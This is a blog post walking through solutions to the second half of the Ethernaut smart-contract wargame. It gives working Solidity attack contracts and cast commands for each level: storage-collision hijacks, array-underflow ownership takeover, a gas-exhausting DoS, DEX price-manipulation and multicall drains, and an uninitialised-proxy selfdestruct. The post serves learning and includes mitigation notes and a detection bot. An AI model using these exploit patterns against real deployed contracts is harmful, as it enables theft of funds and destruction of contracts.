---
layout: post
title:  "Ethernaut Series: Part II"
date:   2022-09-14
categories: 
---
* TOC 
{:toc}
This is the second half of the [Ethernaut](https://ethernaut.openzeppelin.com/) series notes on how I solved each level using Foundry. For the first half, please see the [previous post](http://axucar.ca/2022/09/13/ethernaut-series/). The contracts deployed to solve the challenges, as well as test scripts, can be found on my [Github](https://github.com/axucar/ethernaut-foundry/).

****
# Naught Coin

Since `NaughtCoin` is an `ERC20` token, we can use `transferFrom` instead of `transfer` (see [Openzeppelin docs](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-)). Steps are:
- Deploy attack contract below, which will send tokens via `transferFrom` from `msg.sender` to another arbitrary address (e.g. `0xA36f37e54180d59A9eC172d0f4A5F6c5Ba4F04A3` in my case)
    - `forge create src/AttackNaughtCoin.sol:AttackNaughtCoin --verify --constructor-args <challenge_addr>`
- Set a maximum allowance for the attacker to move funds on behalf of `player` by calling `contract.approve(spender,amount)` on the `NaughtCoin` contract from `player`, where we set `spender` to be the attacker contract we deployed
    - `cast send <challenge_addr> "approve(address, uint256)" <attacker_addr> 1000000000000000000000000`        
    - Note that we cannot call `approve` from the attack contract, since `owner` is defined as `msg.sender` in the approve function of `ERC20.sol`, which needs to be `player` (since only player has the tokens). After approving the attack contract with the transfer rights, we can use the attacker contract to move the funds.
    - When we call `contract.transferFrom(player,to,amount)` inside the attack contract, it requires that `contract.allowance(player, msg.sender)` is large enough, ie. the signer `msg.sender` has the rights to move funds. In this case, `msg.sender` is the attack contract address
- Call `attack()` on the attack contract
    - `cast send <attacker_addr> "attack()"`

```solidity
pragma solidity ^0.8.10;

interface INaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);    
    function allowance(address owner, address spender) external view returns (uint256);
}

contract AttackNaughtCoin {
    address public victim;
    INaughtCoin public nc;

    constructor(address _victim) {
        victim = _victim;        
        nc = INaughtCoin(victim);                
    }

    function attack() public {
        //beforehand, call NaughtCoin's approve(spender, amount) from msg.sender (the token holder)
        //where spender is this attack contract, giving this contract permission to transfer out the player's tokens
        uint256 maxTokens = nc.balanceOf(msg.sender);        
        nc.transferFrom(msg.sender, 0xA36f37e54180d59A9eC172d0f4A5F6c5Ba4F04A3, maxTokens);        
    }
}
```
****

# Preservation

The key is to notice that the storage variables layout between `Library Contract` and `Preservation` did not match, and `timeZone1Library` and `timeZone2Library` are both instances of `LibraryContract`. This is an issue since `timeZone1Library` executes a `delegatecall` within `setFirstTime()`, which allows `Preservation` storage variables to be modified using the code of `LibraryContract`. 
- Calling `setFirstTime()` supposedly sets `storedTime`. However, because `delegatecall` modifies the caller contract's storage, `setFirstTime()` actually sets `timeZone1Library` since it is the first storage variable (as `storedTime` is also the first variable in storage in its corresponding environment). Hence, we can point `timeZone1Library` to our own `MaliciousLibrary` instance     
- Call the challenge contract's `setFirstTime()` again, using any parameter (I chose 0), which we can use to set `owner=tx.origin`, again since `delegatecall` allows us to modify the `Preservation` contract's storage

```solidity
pragma solidity ^0.8.10;

contract MaliciousLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint) public {
        owner=tx.origin;
    }
}

interface IPreservation {    
    function owner() external returns(address);
    function setFirstTime(uint _timeStamp) external;     
}

contract AttackPreservation {
    address public victim;
    IPreservation public p;    
    MaliciousLibrary public m;

    constructor(address _victim) { 
        victim = _victim;   
        m = new MaliciousLibrary();                        
        p = IPreservation(victim);
        p.setFirstTime(uint256(uint160(address(m))));
        p.setFirstTime(0);
    }
}
```
****
# Recovery

Of course, we can use Etherscan to look at the deployed SimpleToken contract under Internal Txs. The more interesting alternative is to deterministically compute the "forgotten" contract address based on the address of the creator (sender) and the number of transactions the creator has sent (nonce). These parameters, sender and nonce, are RLP encoded and hashed with Keccak256. 
- Keep only the rightmost 160 bits = 40 hex digits from the 2+64 = 66-length hex, and append 0x to the front, to get the deployed contract address
- Below is the Javascript snippet (run `node snippet.js`):
```jsx
const {encode : rlp_encode} = require("@ethersproject/rlp");
const {keccak256} = require("@ethersproject/keccak256");
const futureAddress= keccak256(rlp_encode(["<challenge_addr","0x01"]));
console.log("0x" + futureAddress.slice(26,66));
```
- Call selfdestroy of the recovered contract:\
`cast send <recovered_SimpleToken_addr> "destroy(address)" <any_to_addr>`

****
# MagicNumber
We need to deploy contract that returns 42 in raw EVM bytecode. Recall that EVM interprets solidity source code files as bytecode, which is just sequence of hex characters. Bytecode is comprised of two different pieces: initialization (only executed at deployment, telling EVM to store remaining runtime code) and runtime code (permanently stored code on blockchain). 
- [EVM Opcodes Reference](https://www.evm.codes/)
- `return 42` requires the value to be stored in memory not just the stack.
    - `RETURN` is opcode `F3` taking two stack inputs: `(offset, size)`
- Hence, the order of business is to run `MSTORE(position, value)` = `MSTORE(0x00,0x2a)`. Then, we want to run `RETURN(position=0, number of bytes=32)` = `RETURN(0x00,0x20)`
    - `MSTORE` is opcode 52, which takes 2 stack inputs: position (0) and value (42=0x2a)
    - `PUSH1` is opcode 60, stands for pushing 1 byte (2 hex characters) to the stack
    - Note the order of pushing params to stack: with stack data structure, last in first out (LIFO)

```solidity
602a // PUSH1 0x2a
6000 // PUSH1 0x00 (memory slot location offset)
52 //MSTORE (position=0, value=42)

6020 //PUSH1 0x20 (value is 32 bytes for the size param)
6000 // PUSH1 0x00 (memory slot location offset)
f3 //RETURN (position=0, number of bytes=32)
```

Therefore, Runtime opcode sequence in hex : `0x602a60005260206000f3`

- 20 hex digits = 10 bytes
- this bytecode represents a contract that returns 0x2a

Now for the full **contract creation** code: we have two components:
- store in memory the 10 bytes of runtime bytecode from above\
`MSTORE(0, 0x602a60005260206000f3)`
    - `PUSH10` is opcode 69, which is needed to push the 10bytes of `0x602a60005260206000f3` to the stack
    - Since solidity memory slots are 32 bytes, this will pad with 22 zeroes on the left
- return the runtime bytecode: `RETURN(offset=22,size=10)` = `RETURN(0x16, 0x0a)`
    - Recall `RETURN` is opcode `F3` taking two stack inputs: `(offset, size)`

```solidity
//MSTORE runtime bytecode
69602a60005260206000f3 // PUSH10(value=0x602a60005260206000f3) 
6000 // PUSH1 0x00 (position to store bytecode)
52 // MSTORE(position=0, size=10 bytes)
//RETURN
600a //PUSH1 0x0a (size is 10bytes)
6016 //PUSH1 0x16 (position offset=22)
f3 // return(position=22, size=10 bytes)
```

To summarize, the full contract creation opcode sequence in hex : `0x69602a60005260206000f3600052600a6016f3`

To deploy this raw bytecode in foundry, I needed to call `foundryup` in the terminal to get the most recent nightly build, to ensure we have the new feature that allows deploying raw contract bytecode with `cast send --create` (ie. when `to` destination of transaction is not specified). See the merged Github PR [here](https://github.com/foundry-rs/foundry/pull/2871).
- `cast send --create <raw_bytecode_above>`
- Using `web3` library in Javascript, the equivalent command is:\
`web3.eth.sendTransaction({ data: '0x69602a60005260206000f3600052600a6016f3' })`
- In Etherscan, under the contract tab, we should see that the bytecode is only the runtime bytecode left.

[![etherscan-screenshot](/assets/etherscan-rawbyte.png)](/assets/etherscan-rawbyte.png)


To finish the level:\
`cast send <challenge_addr> "setSolver(address)" <deployed_contract_from_rawbytecode>`

****
# Alien Codex

This level tests knowledge of the storage layout of a smart contract (see [docs](https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html)).
- 2^256 - 1 slots (as many slots as there are possible hashes)
- 32 bytes of data per slot

Since `AlienCodex` is `Ownable`, the first variable to be stored is `owner` (address are 20 bytes) from Ownable contract. Next, the bool `contact` variable can still fit in the same first slot. Both are statically sized variables.

For dynamic arrays, specifically `codex` in this case, let the next slot position be `p,` which will store the number of elements in the array, ie. `array.length`. Then, actual array data is at `keccak256(p)` (so that it won’t be overwriting anything existing when we expand the dynamic array). So `array[0]` is stored at `keccak256(p)`, `array[1]` is `keccak256(p)+1`, and so on.

The key vulnerability of this contract is allowing modifying the dynamic array length without checking for over/underflow, which allows us to set the array bounds to cover the entire storage area. This allows us to modify any part of the contract storage.

In this challenge: we have the following storage slot layout

| Slot                         | Variable Stored                        |
|------------------------------|----------------------------------------|
| 0                            | `owner` and `contact`                  |
| 1                            | codex.length                           |
| keccak(1)                    | codex[0]                               |
| keccak(1)+1                  | codex[1]                               |
| ...                          | ...                                    |
| 2^256 - 1                    | codex[2^256 - 1 - uint(keccak(1))]     |
| 0 (overflow, can overwrite!) | codex[2^256 - 1 - uint(keccak(1)) + 1] |

We can thus deploy an attacker contract with the following steps:
1. call `make_contact`
2. call `retract`  which causes underflow from 0 and leads to code.length = 2^256 - 1
3. Now that `codex` length is maximally large, we can index into the slot that overwrites slot 0.
- Slot i corresponds to `codex` array indexed at  `i - keccak256(1)`, so slot 0 = `2^256 - 1 - keccak256(1) + 1`
4. call `revise` with the correct index `i` and your address converted to `bytes32`

```solidity
function attack () public {
    a = IAlienCodex(victim);
    a.make_contact();
    a.retract();        
    a.revise((2**256 - 1) - uint(keccak256(abi.encodePacked(uint(1)))) + 1,bytes32(uint256(uint160(msg.sender))));        
}
```

****

# Denial
Key: Since the `withdraw` function uses `call` to send ETH, we can use reentrancy and implement a fallback function within our attack contract which consumes all the gas. Hence, there will be no gas left for `owner.transfer(amountToSend)`. This is a DoS (denial of service) attack.

The lesson here is that using `call` instead of `send` or `transfer` can introduce vulnerabilities.

With reentrancy, recall the check-effect-interact paradigm (in the `Denial` contract, there is no check for available balances, and the low-level `call`, which allows reentrancy, occurs before the effect of updating balances (classic reentrancy attack setup).

To deny the owner’s withdrawal:

1. deploy an attack contract with fallback function that consumes nearly all the gas
    
    ```
    receive() external payable {        
            while(true){}
        }
    ```

2. `setWithdrawPartner` to be this attack contract
3. call `Denial` contract’s `withdraw()` to confirm that it indeed runs out of gas 

Note that it will still work with sufficiently large amount of gas (2.3M gas and above worked for me), while challenge assumes 1M maximum gas. 

- By default Foundry’s `cast` gave gas limit of 3.4M to withdraw function (so owner still got the drip funds, and was not denied)
- `cast send <challenge_addr> "withdraw()" --gas-limit 1000000` does deny the drip for both parties (out of gas error for both drips)
- Perhaps external `call` is not actually allowed to forward all 100% of the gas available, although I couldn’t find official documentation on this

****
# Shop
Since `price()` of the `Buyer` interface is not actually implemented, it will resort to the definition of our attacker contract 
- It's unsafe to change the state (`price` in this case) based on external, untrusted contracts logic

```solidity
contract AttackShop{        
    IShop public shop;
    uint timesCalled; 

    constructor(address _victim) {
        shop = IShop(_victim);
    }

    function price() external returns (uint) {    
        return shop.isSold() ? 0 : 300;
    }
    function attack() public {        
        shop.buy();                
    }
}
```

****
# Dex

Firstly, a quick note on importing OpenZeppelin contracts in Solidity using foundry.
- `forge install openzeppelin/openzeppelin-contracts`
- `forge remappings > remappings.txt`
    - helps VScode extension to play nicely. see [https://book.getfoundry.sh/config/vscode](https://book.getfoundry.sh/config/vscode)
    - generates this txt file
    
    ```solidity
    ds-test/=lib/forge-std/lib/ds-test/src/
    forge-std/=lib/forge-std/src/
    openzeppelin-contracts/=lib/openzeppelin-contracts/
    ```
    

Setting up remappings for `foundry` allows me to now import the openzeppelin contracts as `

```
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
```

In this challenge, the player starts with 10 of `token1` and `token2`. While the contract starts with 100 of each. 

To exploit this level, we take advantage of the fact that when we swap against the DEX, the price moves in our favor, because $x_{to} = x_{from} * (N_{to})/(N_{from})$. In other words, if we swap all player’s tokens to 20 `token1` , the DEX will now allow the player to swap 10 `token1` for $10*(110/90) = 12$ `token2` , so we just gained tokens out of thin air. 

In fact, the strategy where we keep swapping from all `token1` into all `token2` , and vice versa  repeatedly, will result in the following decreasing DEX contract balances (see the source code [`AttackDex.sol`](https://github.com/axucar/ethernaut-foundry/blob/main/src/AttackDex.sol) and the corresponding test script [`AttackDex.t.sol`](https://github.com/axucar/ethernaut-foundry/blob/main/test_archive/AttackDex.t.sol) which we run via `forge test -vvv --fork-url $ETH_RPC_URL`  ). 

```solidity
Logs:
  Printing coin balances in DEX contract
  ------
  token1: 90
  token2: 110
  ------
  token1: 110
  token2: 86
  ------
  token1: 80
  token2: 110
  ------
  token1: 110
  token2: 69
  ------
  token1: 45
  token2: 110
  ------
  token1: 90
  token2: 0
```

Note that we have to be careful on the final swap to handle case where our swap conversion for the `from` token balance to the `to` token balance would exceed the reserves in the DEX contract. 

```solidity
function lowerboundSwap(address from, address to, uint amount) private {
        bool exceedsReserves =  (dex.getSwapPrice(from, to, amount) > dex.balanceOf(to,address(dex)));
        uint newAmount = exceedsReserves ? dex.balanceOf(from,address(dex)) : amount;
        dex.swap(from ,to, newAmount);        
    }
```

1. Deploy Attacker `forge create src/AttackDex.sol:AttackDex --verify --constructor-args <challenge_addr>`
2. Approve coins for attacker contract to use, signed by player `cast send <dex_contract> "approve(address,uint)" <attacker_address> 9999`
3. Call attack method in attacker contract `cast send <attacker_address> "attack()"`

Indeed, we should find that the `Dex` contract has been emptied of its `token2` coins. 

One way to ameliorate such risk is to use multiple decentralised price oracles; otherwise, large pools of capital relative to trading liquidity can in practice manipulate prices on a DEX with similar simple pricing models. Adding slippage could be another option.

****
# DexTwo

The key is that the DEX contract allows any ERC20 token to be swapped. Thus, we can exploit it by adding a `token3` with minimal supply to the DEX, and allow us to get large quantities of `token1` and `token2` in exchange

1. deploy custom token contract, `token3` which inherits from `ERC20`
    1. mint 1 token to DEX contract
    2. mint 3 tokens to Attacker contract
2. swap 1 `token3` for 100 `token1` since that is the ratio in the DEX
3. swap 2 `token3` for 100 `token2` since that is the new ratio in the DEX

For reference, see the contract source code [`AttackDexTwo.sol`](https://github.com/axucar/ethernaut-foundry/blob/main/src/AttackDexTwo.sol) and the corresponding test script [`AttackDexTwo.t.sol`](https://github.com/axucar/ethernaut-foundry/blob/main/test_archive/AttackDexTwo.t.sol).

****
# Puzzle Wallet

Storage layout for proxy contract has to match the logic contract; otherwise, we get a [storage collision](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies#unstructured-storage-proxies). Thus, it is possible to overwrite the stored variables `pendingAdmin` and `admin` of the `PuzzleProxy` with `owner` and `maxBalance` respectively, in the `PuzzleWallet` logic contract (and vice versa).

Since the goal is to set `admin` via the `setMaxBalance` function, which requires the challenge contract to have 0 balance, we exploit the `multicall` function to register balance for twice the amount that we deposit. Thus, we can withdraw more than we put into the contract (thus emptying the challenge contract).

Within a `multicall` call, we can only call deposit **once.** So it suffices to either do `multicall[deposit(), multicall([deposit()])]` or `multicall[multicall([deposit()]), multicall([deposit()])]` . What does **not** work is `multicall([deposit(), deposit()])` , which returns an “Deposit can only be called once” error. 

The result of this is we are able to call `deposit` twice (registering `msg.value` twice) while only sending ETH once! 

**Steps to complete**:
1. Create attacker contract with enough ether to conduct attack\
`forge create src/AttackPuzzleWallet.sol:AttackPuzzleWallet --value 0.001ether --verify --constructor-args <challenge_addr>`
2. Call attack `cast send <attacker_contract> "attack()”`

```solidity
function attack() public {
    //sets owner
    pw.proposeNewAdmin(address(this)); 
    //as attacker is owner, it can add itself to whitelist
    pw.addToWhitelist(address(this));

    //we are only allowed to call deposit once in the multicall    
    bytes memory depositcall = abi.encodeWithSignature("deposit()");
    bytes[] memory wrapped_depositcall = new bytes[](1);
    wrapped_depositcall[0] = depositcall;

    //we wrap a deposit in another multicall
    //ie., multicall(deposit,multicall(deposit))
    bytes[] memory nestedCall = new bytes[](2);
    nestedCall[0] = depositcall;        
    nestedCall[1] = abi.encodeWithSignature("multicall(bytes[])", wrapped_depositcall);
    
    uint amtToDrain = address(pw).balance; 
    //take credit for existing balance of victim contract, as well as the balance we added
    pw.multicall{value:amtToDrain}(nestedCall);                
    pw.execute(msg.sender, 2*amtToDrain, ""); //drain the puzzlewallet contract
    pw.setMaxBalance(uint256(uint160(msg.sender)));
}
```

We can verify in the game console that the storage slot 1 (corresponding to `admin`) has been successfully updated to our address
- `await web3.eth.getStorageAt(instance, 1);` returns `0x0000000000000000000000009bdcf9696e273afd83992b1fb5672a70532ca9e1`
    - (40-hex address zero-padded to 64 hex characters = 32bytes)

****
# Motorbike

Proxy contracts use `delegatecall` on a logic contract so that business logic code is upgradeable without changing the proxy state.
- To avoid clashes in storage usage between the proxy and logic contract, the address of the logic contract is usually saved in a specific slot (for example `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`
 in OpenZeppelin contracts) guaranteed to be never allocated by a compiler
- Note that the implementation slot `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc` is not a coincidence.
It is the keccak256 hash of "eip1967.proxy.implementation" minus 1
```jsx
//javascript
const strings_utils = require("@ethersproject/strings");
const {keccak256} = require("@ethersproject/keccak256");
console.log(keccak256(strings_utils.toUtf8Bytes("eip1967.proxy.implementation")));
//prints 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbd
```

In this challenge, we want to change the implementation of the `Engine` logic contract to a  malicious one (that contains the `SELFDESTRUCT` operation), using `upgradeToAndCall()` which requires us to be the `upgrader`. However, the only way to set `upgrader` is via `initialize()`. 

Since `Engine` implements `Initializable`, the function `initialize()` can only be called once. Thankfully, we notice that the call to `initialize()` in the Motorbike constructor is via a `delegatecall`, which means that it only modifies the storage state of proxy `Motorbike`, not the logic contract `Engine` storage. In other words, we can still call `initialize()` in the context of `Engine`'s state. In fact, `initialized` is still set to `false` and `upgrader` is set to `0x00` in the `Engine` state. This is the crux of the challenge: the proxy uses the implementation purely for logic and modifies only the storage within the proxy contract, since the proxy interacts with the logic implementation only via `delegatecall`. The takeaway here is to **remember to initialise implementation contracts**!

**Steps:**

1. Get contract address of `Engine` , the logic contract that we want to selfdestruct via `delegatecall`
    
    `cast storage <challenge_addr> <IMPLEMENTATION_SLOT>` 
    
2. deploy `AttackMotorbike` contract, with input of Engine’s address. The attack consists of:
    1. call Engine’s `initialize()`
    2. call `upgradeToAndCall` using calldata code of `selfdestruct`

```solidity
function attack() public {
    (bool success, ) = engineAddress.call(abi.encodeWithSignature("initialize()"));
    require(success, "engine could not be initialized");

    Destroy d = new Destroy();        
    bytes memory data = abi.encodeWithSignature("selfDestruct()");
    (bool success2, ) = engineAddress.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(d), data));
    require(success2, "upgrade to and call failed");
}
```

Note that the `Destroy` contract just needs the `selfdestruct` function.

```solidity
contract Destroy {
    function selfDestruct() external {
        selfdestruct(payable(tx.origin));
    }
}
```

Finally, we can verify on Etherscan that the engine contract has been self-destructed.

****
# DoubleEntryPoint

The vulnerability for this challenge is that `CryptoVault`'s function `sweepToken` is supposed to prevent the token being swept from being the underlying `DET` token: `require(token != underlying, "Can't transfer underlying token");` . However, this can be bypassed by simply calling `sweepToken` on the `LegacyToken` contract, whose `delegate` variable is indeed the underlying token `DET` so its `delegate.delegateTransfer(to,value,msg.sender)` call would sweep the entire Vault’s balance of underlying tokens `DET` to the `sweptTokensRecipient` .

To prevent (or at least alert us of) this vulnerability, we implement a `DetectionBot` contract to be set as `Forta`’s bot to detect when both:
1. `delegateTransfer(address, uint256, address)` is called
2. the caller of the above is the `CryptoVault` contract

We initialise the `DetectionBot` with these two parameters. Notice that the detection bot must also implement `handleTransaction`  called within `forta.notify()` which handles whether `forta` should `raiseAlert` , raising the `botRaisedAlerts[<detectionbot_address>]` counter by one. 

```solidity
contract DetectionBot {
    address refUser;
    bytes refMsgData;
    constructor (address _refUser, bytes memory _refMsgData) {
        refUser = _refUser;
        refMsgData = _refMsgData;
    }

    function handleTransaction(address user, bytes calldata msgData) public {        
        bytes memory functionSig = msgData[:4];
        ( , , address origSender) = abi.decode(msgData[4:],(address,uint256,address));

        //check that origSender is the CryptoVault contract        
        if ((origSender==refUser) && (keccak256(functionSig) == keccak256(refMsgData))) {
            //the msg.sender (caller of DetectionBot.handleTransaction) is a Forta contract
            IForta forta = IForta(msg.sender);
            forta.raiseAlert(user);
        }
    }
}
```

- The first 4 bytes of `msg.data` msgData[:4] is simply the function signature when we call `delegateTransfer`
    - ie. `abi.encodeWithSignature("delegateTransfer(address,uint256,address)")` = `0x9cd1a121` which is 4 bytes
- The remaining bytes of `msg.data` can then be decoded into the `(address to, uint256 value, address origSender)` parameters. Crucially, the `origSender` address must match the `CryptoVault` address we are tracking

When running `AttackDoubleEntryPoint.t.sol`, which attempts to sweep the entire `DET` balance from `CryptoVault` after setting up the `DetectionBot`,  the test should fail with `FAIL. Reason: Alert has been triggered, reverting`

**Steps:**
1. Deploy DetectionBot contract, where `<function_sig>` is `0x9cd1a121` as discussed above\
`forge create src/AttackDoubleEntryPoint.sol:DetectionBot --constructor-args <cryptoVault_address> <function_sig>`
2. Call `setDetectionBot` on `Forta` contract\
`cast send <forta_address> "setDetectionBot(address)" <detectionbot_address>`

****
# Good Samaritan

We see that the `Coin` contract is initialised with 1 million balance. Our goal is to drain all these tokens from the contract. In the `GoodSamaritan` contract, we see that there is a `requestDonation()` function which sends either 10 or all of the tokens to `msg.sender`. This is promising.

- In the `Wallet` contract, notice that when the balance is < 10, we `revert NotEnoughBalance()`, which is caught in the try-catch within `requestDonation()` triggering `wallet.transferRemainder(msg.sender)`
- Ideally, we would like to return the same `revert NotEnoughBalance()` error even when the balance is 1 million.

```solidity
function donate10(address dest_) external onlyOwner {
    // check balance left
    if (coin.balances(address(this)) < 10) {
        revert NotEnoughBalance();
    } else {
        // donate 10 coins
        coin.transfer(dest_, 10);
    }
}
```

Thankfully, we see that the `Coin` contract’s `transfer` function has an exploitable feature (if the destination `_dest.isContract()` is true): `INotifyable(dest_).notify(amount_)`.

```solidity
//Coin's transfer function
function transfer(address dest_, uint256 amount_) external {
    uint256 currentBalance = balances[msg.sender];

    // transfer only occurs if balance is enough
    if(amount_ <= currentBalance) {
        balances[msg.sender] -= amount_;
        balances[dest_] += amount_;

        if(dest_.isContract()) {
            // notify contract (EXPLOIT HERE!!)
            INotifyable(dest_).notify(amount_);
        }
    } else {
        revert InsufficientBalance(currentBalance, amount_);
    }
}
```

All we need to do is deploy a malicious contract implementing `notify(amount)` which simply reverts as `revert NotEnoughBalance()`. However, we have to be careful with one detail: it must only revert when the `amount` parameters is 10 (or less). See below for code.

This is so that `wallet.donate10(msg.sender)` will get reverted on the try statement (since amount=10), but on the catch statement, the call `wallet.transferRemainder(msg.sender)` should be allowed to go through, which ends up executing `coin.transfer(attacker, amount=1000000)`. 

```solidity
contract AttackGoodSamaritan is INotifyable {

    address victim;
    error NotEnoughBalance();

    constructor (address _victim) {
        victim = _victim;
    }

    function attack() public{
        IGoodSamaritan g = IGoodSamaritan(victim);
        g.requestDonation();
    }

    function notify(uint256 _amount) pure public {        
        //revert on wallet.donate10(msg.sender), ie. amount=10
        //but don't revert on wallet.transferRemainder(msg.sender), ie. amount=1000000
        if(_amount <= 10) {
            revert NotEnoughBalance();
        }        
    }
}
```

Indeed, in the foundry Test script logging we see that `coin.balances(<attacker_address>)` goes from 0 to 1 million after calling `attack()`.